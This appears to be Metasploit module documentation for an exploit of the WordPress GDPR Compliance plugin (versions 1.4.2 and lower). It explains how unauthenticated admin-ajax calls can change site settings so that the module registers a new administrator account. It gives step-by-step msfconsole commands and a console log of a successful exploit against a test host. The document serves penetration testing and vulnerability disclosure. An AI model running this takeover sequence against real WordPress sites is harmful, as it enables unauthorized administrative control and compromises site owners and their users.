## Description

This module exploits the [Wordpress GDPR compliance plugin](https://wordpress.org/plugins/wp-gdpr-compliance/) lack of validation ([WPVDB 9144](https://wpvulndb.com/vulnerabilities/9144)), which affects versions 1.4.2 and lower.

When a user triggers GDPR-related actions, Wordpress's `admin-ajax.php` is called but fails to do validation and capacity checks regarding the asked actions. This leads to any unauthenticated user being able to modify any arbitrary settings on the targeted server.

This module changes the admin email (optional) to prevent notification sending, enables new user registration, changes the default role of new users to Administrator, and registers a new user that can be used for authentication. The attacker can then log in and take any actions on the newly compromised site.

## Vulnerable Application

[GDPR Compliance plugin <= 1.4.2](https://downloads.wordpress.org/plugin/wp-gdpr-compliance.1.4.2.zip)

## Verification Steps

1. Install the application
2. `./msfconsole`
3. `use auxiliary/admin/http/wp_gdpr_compliance_privesc`
4. `set RHOST [wp host]`
5. `set RPORT [wp port]`
6. `set EMAIL [email address]`
7. `run`

## Scenarios

### Tested on Debian 9.6 running Wordpress 4.7.5 with WordPress GDPR Compliance plugin 1.4.2:

```
msf5 > use auxiliary/admin/http/wp_gdpr_compliance_privesc
msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) > set verbose true
verbose => true
msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) > set rhosts 172.22.222.145
rhosts => 172.22.222.145
msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) > set email test@example.com
email => test@example.com
msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) > check

[*] Checking /wp-content/plugins/wp-gdpr-compliance/readme.txt
[*] Found version 1.4.2 of the plugin
[*] 172.22.222.145:80 The target appears to be vulnerable.
msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) > exploit

[*] Getting security token from host...
[!] Enabling user registrations...
[!] Setting the default user role type to administrator...
[*] Registering msfuser with email test@example.com
[*] Auxiliary module execution completed
msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) >
```
